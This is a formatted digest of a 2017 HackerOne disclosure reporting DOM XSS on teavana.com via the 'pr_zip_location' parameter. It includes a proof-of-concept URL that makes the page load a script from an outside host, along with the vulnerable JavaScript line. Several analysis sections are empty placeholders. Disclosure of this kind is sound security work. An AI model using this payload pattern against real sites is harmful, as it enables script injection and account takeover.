# DOM XSS on teavana.com via "pr_zip_location" parameter

## Metadata
- **Source:** HackerOne
- **Report:** 209736 | https://hackerone.com/reports/209736
- **Submitted:** 2017-03-01
- **Reporter:** fizhimchik
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello Starbucks team,,

I've discovered DOM XSS on `teavana.com` involving `pr_zip_location` URL parameter. PoC:

http://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.j?

Works in all major browsers. Vulnerable code is in `full.js`:

```js
var DR = Z(DS) + "/content/" + k(DQ) + "/contents.js";
```

That allows to execute absolutely a

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello Starbucks team,,

I've discovered DOM XSS on `teavana.com` involving `pr_zip_location` URL parameter. PoC:

http://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.j?

Works in all major browsers. Vulnerable code is in `full.js`:

```js
var DR = Z(DS) + "/content/" + k(DQ) + "/contents.js";
```

That allows to execute absolutely arbitrary javascript in the context on `teavana.com` domain. As described in #202011 that directly leads to theft of customer account data and account takeover, hence I set severity to Critical.

Also, I have discovered a number of other XSS attacks on similar pages, involving other parameters and sinks. Should I submit them all as individual bug reports?

Thanks.


</details>

---
*Analysed by Claude on 2026-05-24*
